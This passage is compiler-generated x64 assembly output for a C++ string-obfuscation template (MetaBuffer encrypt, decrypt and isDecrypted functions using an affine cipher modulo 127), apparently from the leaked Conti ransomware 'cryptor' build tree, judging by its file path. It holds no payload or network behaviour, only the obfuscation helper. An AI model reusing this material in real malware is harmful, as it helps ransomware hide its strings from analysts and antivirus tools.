; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 42	 add	 r8d, 66			; 00000042H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 55 00 00 00	 mov	 ecx, 85			; 00000055H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 55
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+85]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::isDecrypted
_TEXT	ENDS
END
